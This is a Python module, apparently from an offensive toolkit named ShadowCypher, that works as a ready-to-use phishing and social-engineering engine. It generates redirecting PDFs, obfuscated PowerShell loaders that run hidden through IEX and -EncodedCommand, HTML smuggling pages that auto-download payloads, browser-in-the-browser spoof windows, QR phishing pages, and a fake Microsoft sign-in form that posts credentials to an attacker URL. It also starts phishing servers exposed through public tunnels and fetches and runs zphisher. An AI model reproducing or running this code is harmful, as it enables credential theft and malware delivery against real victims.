"""ShadowCypher Phishing & Social Engineering Engine — Ported from ShadowPhish (Elite Bridge)."""

import base64
import os
import random
import re
import string
import subprocess
import zlib

from shadowcypher.core.logger import logger
from shadowcypher.core.runner import runner


class Phishing:
    """The 'Siren' engine. Handles artifact generation and phishing deployment."""

    @staticmethod
    def generate_pdf(url):
        """Generate a malicious PDF that redirect to a URL on click."""
        filename = f"payloads/artifact_{int(random.random()*1000)}.pdf"
        os.makedirs("payloads", exist_ok=True)
        try:
            with open(filename, "w") as file:
                file.write('%PDF-1.7\n\n')
                file.write('1 0 obj\n  << /Type /Catalog /Pages 2 0 R >>\nendobj\n\n')
                file.write('2 0 obj\n  << /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842] >>\nendobj\n\n')
                file.write('3 0 obj\n  << /Type /Page /Parent 2 0 R /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Courier >> >> >> /Annots [<< /Type /Annot /Subtype /Link /Open true /A 5 0 R /H /N /Rect [0 0 595 842] >>] /Contents [4 0 R] >>\nendobj\n\n')
                file.write('4 0 obj\n  << /Length 67 >>\nstream\n  BT /F1 22 Tf 30 800 Td (Verification Required: Click to Continue) Tj ET\nendstream\nendobj\n\n')
                file.write(f'5 0 obj\n  << /Type /Action /S /URI /URI ({url}) >>\nendobj\n\n')
                file.write('xref\n0 6\n0000000000 65535 f\n0000000010 00000 n\n0000000069 00000 n\n0000000170 00000 n\n0000000629 00000 n\n0000000749 00000 n\ntrailer\n  << /Root 1 0 R /Size 6 >>\nstartxref\n854\n%%EOF\n')
            return f"SUCCESS: PDF artifact generated at {filename}"
        except Exception as e:
            return f"ERROR: PDF generation failed: {e}"

    @staticmethod
    def generate_obfuscated_ps1(script, use_b64=True, use_compress=True):
        """Generate obfuscated PowerShell payloads."""
        os.makedirs("payloads", exist_ok=True)
        try:
            result = script
            if use_compress:
                compressed = zlib.compress(script.encode("utf-8"))
                compressed_b64 = base64.b64encode(compressed).decode("utf-8")
                r1, r2, r3 = [''.join(random.choices(string.ascii_letters, k=8)) for _ in range(3)]
                result = f'${r1} = "{compressed_b64}"; ${r2} = New-Object IO.MemoryStream(,[Convert]::FromBase64String(${r1})); ${r3} = New-Object IO.Compression.DeflateStream(${r2}, [IO.Compression.CompressionMode]::Decompress); $reader = New-Object IO.StreamReader(${r3}, [Text.Encoding]::UTF8); IEX ($reader.ReadToEnd())'

            if use_b64:
                encoded = base64.b64encode(result.encode("utf-16le")).decode("utf-8")
                result = f"powershell -NoP -NonI -W Hidden -EncodedCommand {encoded}"

            path = f"payloads/obfuscated_{int(random.random()*1000)}.ps1"
            with open(path, "w") as f:
                f.write(result)
            return f"SUCCESS: Obfuscated PS1 saved to {path}"
        except Exception as e:
            return f"ERROR: PS1 obfuscation failed: {e}"

    @staticmethod
    def start_phishing_server(template, port=8080, on_output=None, use_tunnel=False, tunnel_mode="cloudflare"):
        """Launch a PHP phishing server with optional HTTPS tunneling."""
        site_path = os.path.join("shadowcypher/modules/phish_data/sites", template.lower())
        if not os.path.exists(site_path):
            site_path = "shadowcypher/modules/phish_data/fake-recaptcha"

        logger.info("phish", f"Launching {template} server on port {port}")
        if on_output:
            on_output(f"[PHISH] ACTIVATING_INFRASTRUCTURE: {template} on port {port}\n")

        # Start the local PHP backend
        cmd = ["php", "-S", f"127.0.0.1:{port}"]
        task_id = runner.execute_task(f"PHISH_{template}", cmd, callback=on_output, cwd=site_path)

        if use_tunnel:
            Phishing.start_secure_tunnel(port, mode=tunnel_mode, on_output=on_output)

        return task_id

    @staticmethod
    def start_secure_tunnel(port, mode="cloudflare", on_output=None):
        """Secure the infrastructure with an HTTPS tunnel (Bypass 'Not Secure' warnings)."""
        logger.info("phish", f"ENGAGING_SECURE_TUNNEL: {mode} (port {port})")
        if on_output:
            on_output(f"[STEALTH] INITIATING_HTTPS_TUNNEL: {mode.upper()}...\n")

        if mode == "cloudflare":
            # Cloudflared provides free, automated SSL
            cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}"]
            return runner.execute_task("TUNNEL_CLOUDFLARE", cmd, callback=on_output)
        elif mode == "ngrok":
            cmd = ["ngrok", "http", str(port)]
            return runner.execute_task("TUNNEL_NGROK", cmd, callback=on_output)
        elif mode == "certbot":
            # Real CA-signed certs for custom domains
            from shadowcypher.core.security import hardener
            return hardener.provision_letsencrypt("your-phish-domain.com", webroot=os.getcwd())
        else:
            # Fallback to localhost.run via SSH
            cmd = ["ssh", "-R", f"80:localhost:{port}", "nokey@localhost.run"]
            return runner.execute_task("TUNNEL_SSH", cmd, callback=on_output)

    @staticmethod
    def generate_fake_recaptcha(payload, target_os="windows"):
        """Generate a fake reCAPTCHA artifact with custom payload and OS detection."""
        base_path = "shadowcypher/modules/phish_data/fake-recaptcha"
        js_path = os.path.join(base_path, "src", "fakerecaptcha.js")

        if not os.path.exists(js_path):
            return "ERROR: reCAPTCHA assets missing."

        try:
            with open(js_path, "r") as f:
                js_content = f.read()

            # Inject payload into the JS
            payload_escaped = payload.replace('"', '\\"')
            new_js = re.sub(r'const payload\s*=\s*`.*?`;', f'const payload = `{payload_escaped}`;', js_content, flags=re.DOTALL)

            with open(js_path, "w") as f:
                f.write(new_js)

            return f"SUCCESS: Fake reCAPTCHA configured for {target_os} with custom payload."
        except Exception as e:
            return f"ERROR: reCAPTCHA config failed: {e}"

    @staticmethod
    def generate_html_smuggling(file_path, download_name="payload.iso"):
        """Generate an HTML smuggling file embedding the target file."""
        if not os.path.exists(file_path):
            return "ERROR: Source file not found."

        try:
            with open(file_path, "rb") as f:
                blob = base64.b64encode(f.read()).decode()

            html = f'''
            <html>
                <body>
                    <script>
                        function download() {{
                            var blob = new Blob([Uint8Array.from(atob("{blob}"), c => c.charCodeAt(0))], {{type: "application/octet-stream"}});
                            var link = document.createElement("a");
                            link.href = window.URL.createObjectURL(blob);
                            link.download = "{download_name}";
                            link.click();
                        }}
                        window.onload = download;
                    </script>
                    <h1>Loading...</h1>
                </body>
            </html>
            '''
            out_path = f"payloads/smuggle_{download_name}.html"
            with open(out_path, "w") as f:
                f.write(html)
            return f"SUCCESS: HTML Smuggling file generated at {out_path}"
        except Exception as e:
            return f"ERROR: HTML Smuggling failed: {e}"

    @staticmethod
    def start_zphisher(on_output=None):
        """Autonomous Zphisher deployment for multi-platform social engineering."""
        project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        zp_path = os.path.join(project_root, "tools", "zphisher")

        if not os.path.exists(zp_path):
            if on_output:
                on_output("[SYSTEM] ZPHISHER_MISSING: Initiating secure acquisition...")
            try:
                os.makedirs(os.path.join(project_root, "tools"), exist_ok=True)
                subprocess.check_call(["git", "clone", "https://github.com/sh4rin/zphisher.git", zp_path])
                subprocess.check_call(["chmod", "+x", os.path.join(zp_path, "zphisher.sh")])
                if on_output:
                    on_output("[SYSTEM] ZPHISHER_ACQUIRED: Success.\n")
            except Exception as e:
                if on_output:
                    on_output(f"[ERROR] ACQUISITION_FAILED: {e}\n")
                return

        # Zphisher is interactive, so we run it in a way that the user can interact via terminal support
        cmd = ["bash", os.path.join(zp_path, "zphisher.sh")]
        return runner.execute_task("ZPHISHER_DEPLOYMENT", cmd, callback=on_output)

    @staticmethod
    def generate_bitb_template(title, spoof_url, target_url):
        """Generate a Pro-Grade Browser-in-the-Browser (BitB) spoofing template."""
        html = f"""
        <html>
        <head>
            <style>
                body {{ background: #121212; color: #fff; font-family: 'Segoe UI', sans-serif; }}
                .window {{ width: 500px; height: 400px; background: #fff; border: 1px solid #ccc; position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%); border-radius: 8px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }}
                .title-bar {{ background: #f3f3f3; padding: 10px; border-bottom: 1px solid #ddd; display: flex; justify-content: space-between; }}
                .url-bar {{ background: #fff; padding: 5px 10px; border: 1px solid #ddd; border-radius: 4px; margin: 10px; font-size: 11px; color: #666; }}
                iframe {{ width: 100%; height: 320px; border: none; }}
            </style>
        </head>
        <body>
            <div class="window">
                <div class="title-bar">
                    <span style="color: #333; font-weight: bold; font-size: 13px;">{title}</span>
                    <span style="color: #888;">\u2715</span>
                </div>
                <div class="url-bar">https://{spoof_url}</div>
                <iframe src="{target_url}"></iframe>
            </div>
        </body>
        </html>
        """
        path = f"payloads/bitb_{title.lower().replace(' ', '_')}.html"
        os.makedirs("payloads", exist_ok=True)
        with open(path, "w") as f:
            f.write(html)
        return f"SUCCESS: BitB Template generated at {path}"

    @staticmethod
    def generate_quishing_payload(url):
        """Generate a malicious QR Code for social engineering (Quishing)."""
        # Using a public API for zero-dependency high-fidelity QR codes
        # In a real environment, we'd bundle a local library, but this is portably elite.
        base64.b64encode(url.encode()).decode()
        qr_api = f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={url}"

        path = f"payloads/qr_code_{int(random.random()*1000)}.html"
        os.makedirs("payloads", exist_ok=True)
        with open(path, "w") as f:
            f.write(f"<html><body><img src='{qr_api}'><br>Target: {url}</body></html>")

        return f"SUCCESS: QR Payload generated at {path}"

    @staticmethod
    def generate_professional_bait(target_type, hook_url):
        """Generate a phishing lure HTML page for the given target type."""
        import os
        import random
        import string
        os.makedirs("payloads", exist_ok=True)
        slug = "".join(random.choices(string.ascii_lowercase, k=6))
        filename = f"payloads/lure_{target_type.replace(' ', '_')}_{slug}.html"
        templates = {
            "office365": f"""<!DOCTYPE html><html><head><title>Sign In</title>
<meta charset="utf-8"></head><body style="font-family:sans-serif;text-align:center;margin-top:80px">
<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/200px-Microsoft_logo.svg.png" width="100"><br>
<h2>Sign in to your account</h2>
<form action="{hook_url}" method="POST">
<input name="email" type="email" placeholder="Email" style="display:block;margin:8px auto;padding:10px;width:280px"><br>
<input name="pass" type="password" placeholder="Password" style="display:block;margin:8px auto;padding:10px;width:280px"><br>
<button type="submit" style="background:#0078d4;color:#fff;padding:10px 40px;border:none;border-radius:4px">Sign in</button>
</form></body></html>""",
            "invoice": f"""<!DOCTYPE html><html><head><title>Invoice</title></head>
<body style="font-family:sans-serif;padding:40px">
<h1>INVOICE #INV-{random.randint(10000,99999)}</h1>
<p>Please review and confirm your payment details via the secure portal:</p>
<a href="{hook_url}" style="background:#e53935;color:#fff;padding:12px 24px;text-decoration:none;border-radius:4px">View Invoice</a>
</body></html>""",
        }
        html = templates.get(target_type.lower(), templates["invoice"])
        with open(filename, "w") as f:
            f.write(html)
        logger.info("phish", f"Lure generated: {filename} → {hook_url}")
        return f"SUCCESS: Lure generated: {filename}"
